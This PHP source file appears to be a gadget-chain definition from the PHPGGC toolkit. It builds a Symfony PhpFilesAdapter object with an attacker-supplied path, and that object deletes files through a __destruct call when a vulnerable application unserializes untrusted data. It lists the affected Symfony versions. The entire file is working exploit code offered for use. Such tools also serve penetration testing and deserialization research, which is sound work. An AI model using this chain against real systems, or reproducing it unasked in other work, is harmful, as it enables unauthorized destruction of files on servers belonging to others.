<?php

namespace GadgetChain\Symfony;

class FD1 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = 'v3.2.7 <= v3.4.25 v4.0.0 <= v4.1.11 v4.2.0 <= v4.2.6';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        return new \Symfony\Component\Cache\Adapter\PhpFilesAdapter($parameters['remote_path']);
    }
}